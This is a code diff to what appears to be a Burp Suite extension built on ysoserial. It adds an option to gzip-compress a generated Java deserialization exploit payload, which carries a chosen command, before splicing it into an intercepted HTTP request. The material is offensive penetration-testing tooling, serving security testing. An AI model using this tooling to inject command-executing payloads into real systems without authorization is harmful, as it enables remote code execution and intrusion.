@@ -5,16 +5,19 @@ import com.google.common.primitives.Bytes;
 import ysoserial.Serializer;
 import ysoserial.payloads.ObjectPayload;
 
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Base64;
 import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import java.util.zip.GZIPOutputStream;
 
 public class Utilities {
 
-    public static byte[] serializeRequest(byte[] message, byte[] selectedMessage, boolean isEncoded, String command, IExtensionHelpers helpers, String payloadType) {
+    public static byte[] serializeRequest(byte[] message, byte[] selectedMessage, boolean isEncoded, boolean isGzCompressed, String command, IExtensionHelpers helpers, String payloadType) {
 
         int selectedOffset = 0;
         int endingOffset = 0;
@@ -40,6 +43,22 @@ public class Utilities {
             byte[] endingArray = Arrays.copyOfRange(message, endingOffset, message.length);
 
             byte[] exploitArray = getExploitPayload(payloadType, command);
+            
+            if (isGzCompressed) {
+            	ChildTab.isGzCompressed = true;
+            	try {
+            		ByteArrayOutputStream gzOsBytes = new ByteArrayOutputStream();
+            		GZIPOutputStream gzOs = new GZIPOutputStream(gzOsBytes);
+            		gzOs.write(exploitArray);
+            		gzOs.close();
+            		exploitArray = gzOsBytes.toByteArray();
+            	} catch (IOException ioe) {
+            		System.err.println("Error while compressing payload");
+                    ioe.printStackTrace();
+            	}
+            } else {
+            	ChildTab.isGzCompressed = false;
+            }
 
             ChildTab.selectedMessage = exploitArray;
 
